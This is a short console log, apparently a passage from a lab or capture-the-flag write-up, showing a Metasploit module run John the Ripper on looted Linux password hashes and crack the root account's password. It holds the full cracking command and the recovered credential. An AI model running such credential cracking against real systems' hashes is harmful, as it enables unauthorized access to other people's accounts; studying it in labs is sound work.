[*]    Cracking Command: /usr/sbin/john --session=aTbJEJRg --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=sha512crypt --wordlist=/tmp/jtrtmp20221104-435-qwpe1t --rules=wordlist /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[+] Cracked Hashes
==============

 DB ID  Hash Type    Username  Cracked Password  Method
 -----  ---------    --------  ----------------  ------
 1      sha512crypt  root      password          Single

[*] Auxiliary module execution completed
```
